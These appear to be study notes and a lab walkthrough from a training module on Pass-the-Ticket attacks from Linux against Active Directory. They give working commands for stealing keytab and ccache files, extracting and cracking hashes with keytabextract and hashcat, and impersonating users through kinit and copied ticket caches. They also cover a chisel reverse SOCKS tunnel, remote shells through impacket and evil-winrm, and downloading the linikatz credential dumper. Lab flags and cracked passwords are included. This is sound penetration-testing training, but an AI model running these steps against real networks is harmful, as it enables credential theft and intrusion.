# Pass the Ticket (PtT) from Linux

A Linux computer connected to Active Directory commonly uses Kerberos as authentication.

A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. 
It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

## Kerberos on Linux

In most cases, Linux machines store Kerberos tickets as ccache files in the /tmp directory. 

By default, the location of Kerberos ticket is stored in the environment variable KRB5CCNAME

keytab file = containing pairs of Kerberos principals and encrypted keys

Linux Auth from MS01 Image :

ssh david@$domain@$TARGET

Port forward :

ssh david@inlanefreight.htb@10.129.204.23 -p 2222

## Identifying Linux and Active Directory Integration

realm - Check If Linux Machine is Domain Joined :

realm list

other tools to integrate Linux into AD domain : sssd or winbind

ps -ef | grep -i "winbind\|sssd"

## Finding Kerberos Tickets in Linux

Finding Keytab Files :

find / -name *keytab* -ls 2>/dev/null

Identifying Keytab Files in Cronjobs :

crontab -l 

kinit function is to request the user's TGT and store this ticket in the cache (ccache file).

We can use kinit to import keytab and act as a user.

/etc/krb5.keytab : default location of the ticket associated to the computer account

## Finding ccache Files

Reviewing Environment Variables for ccache Files :

env | grep -i krb5

ls -la /tmp :
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau

## Abusing KeyTab Files

Listing keytab File Information :

klist -k -t 

Impersonating a User with a keytab :

klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist

Connecting to SMB Share as a user :

smbclient //dc01/carlos -k -c ls


Keytab Extract :

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

NTLM hash -> Pass the Hash attack or crack to obtain the plaintext password
AES256 or AES128 hash -> forge our tickets using Rubeus or crack to obtain the plaintext password

## Abusing Keytab ccache

Privilege Escalation to Root :

sudo -l
sudo su

Looking for ccache Files :

ls -la /tmp

Identifying Group Membership with the id Command :

id julio@inlanefreight.htb

Importing the ccache File into our Current Session :

klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass

-> consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work.

## Using Linux Attack Tools with Kerberos

### Preparation for using Impacket and Evil-Winrm

Host File Modified :

cat /etc/hosts
172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01

Proxychains Configuration File :

cat /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080

Download Chisel to our Attack Host :

wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 

Connect to MS01 with xfreerdp :

xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution

Execute chisel from MS01 :

c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

Setting the KRB5CCNAME Environment Variable :

export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

### Impacket

Using Impacket with proxychains and Kerberos Authentication :

proxychains impacket-wmiexec dc01 -k

### Evil-Winrm

Evil-Winrm - Installing Kerberos Authentication Package :

sudo apt-get install krb5-user -y
cat /etc/krb5.conf
[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
proxychains evil-winrm -i dc01 -r inlanefreight.htb

### Miscellaneous

Convert ccache file to kirbi :

impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Importing Converted Ticket into Windows Session with Rubeus :

C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

### Linikatz

Linikatz Download and Execution :

wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh


## LAB

ssh david@inlanefreight.htb@$TARGET -p 2222

cat flag.txt
Gett1ng_Acc3$$_to_LINUX01

realm list
permitted-groups: Linux Admins

find / -name *keytab* -ls 2>/dev/null
262184      4 -rw-rw-rw-   1 root     root          216 Nov  5 19:55 /opt/specialfiles/carlos.keytab

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
a738f92b3c08b424ec2d99589a9cce60

sudo hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
a738f92b3c08b424ec2d99589a9cce60:Password5

ssh carlos@inlanefreight.htb@$TARGET -p 2222
Password5

cat flag.txt
C@rl0s_1$_H3r3

crontab -l 
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt

carlos@inlanefreight.htb@linux01:~$ klist
Ticket cache: FILE:/tmp/krb5cc_647402606_4IftT0
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
11/05/23 20:10:52  11/06/23 06:10:52  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 11/06/23 20:10:52

timedatectl
Local time: Sun 2023-11-05 20:15:33 UTC

env | grep -i krb5
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_91JyEJ

python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d

Rubeus.exe  asktgt /domain:inlanefreight.htb /user:svc_workstations /aes256:0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d /nowrap


crackmapexec ssh $TARGET -u svc_workstations -d . -H 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d

python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
	AES-128 HASH : 3a7e52143531408f39101187acc80677

sudo hashcat -m 1000 7247e8d4387e76996ff3f18a34316fdd /usr/share/wordlists/rockyou.txt
7247e8d4387e76996ff3f18a34316fdd:Password4

ssh svc_workstations@inlanefreight.htb@$TARGET -p 2222
Password4

Mor3_4cce$$_m0r3_Pr1v$

cat /root/flag.txt
Ro0t_Pwn_K3yT4b

ls -la /tmp

-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Nov  6 12:45 krb5cc_647401106_bm0Tl7
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Nov  6 12:45 krb5cc_647401106_HRJDux
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Nov  6 12:45 krb5cc_647401109_MCP4yh
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1746 Nov  6 12:45 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Nov  6 12:40 krb5cc_647402606_91JyEJ

klist

cd /root/
cp /tmp/krb5cc_647401106_HRJDux .
export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
klist

Ticket cache: FILE:/root/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/07/22 11:32:01  10/07/22 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 10/08/22 11:32:01


cp /tmp/krb5cc_647401106_bm0Tl7 .
export KRB5CCNAME=/root/krb5cc_647401106_bm0Tl7
klist

Valid starting     Expires            Service principal
11/06/23 12:55:02  11/06/23 22:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 11/07/23 12:55:02


smbclient //dc01/c$ -k -c 'ls' -no-pass
smbclient //dc01/c$ -k -c 'recurse;ls' -no-pass
smbclient //dc01/c$ -k -c 'get julio/flag.txt /root/julio.txt' -no-pass

cat julio.txt 
JuL1()_N3w_fl@g

rm julio.txt
smbclient //dc01/julio -k -c 'get julio.txt /root/julio.txt' -no-pass

cat julio.txt 
JuL1()_SH@re_fl@g

cd /root
cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB .
export KRB5CCNAME=/root/ccache_INLANEFREIGHT.HTB
klist

Ticket cache: FILE:/root/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
11/06/23 21:43:17  11/07/23 07:43:17  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 11/07/23 21:43:17
11/06/23 21:43:17  11/07/23 07:43:17  ldap/dc01.inlanefreight.htb@
	renew until 11/07/23 21:43:17
11/06/23 21:43:17  11/07/23 07:43:17  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
	renew until 11/07/23 21:43:17

smbclient //dc01/linux01 -k -c 'recurse;ls' -no-pass
smbclient //dc01/linux01 -k -c 'get flag.txt /root/flaglinux01.txt' -no-pass

cat flaglinux01.txt 
��Us1nG_KeyTab_Like_@_PRO